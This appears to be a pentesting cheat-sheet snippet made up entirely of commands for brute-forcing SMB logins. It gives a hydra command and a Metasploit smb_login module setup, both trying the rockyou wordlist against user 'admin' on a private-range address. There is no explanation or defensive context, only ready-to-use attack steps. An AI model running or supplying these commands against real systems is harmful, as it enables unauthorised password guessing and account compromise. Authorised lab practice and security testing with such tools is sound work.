### hydra
````bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.15 smb
````
### Metasploit
````bash
use auxiliary/scanner/smb/smb_login
set SMBUser admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set rhosts 10.0.2.15
set lhost 10.0.2.10
exploit
````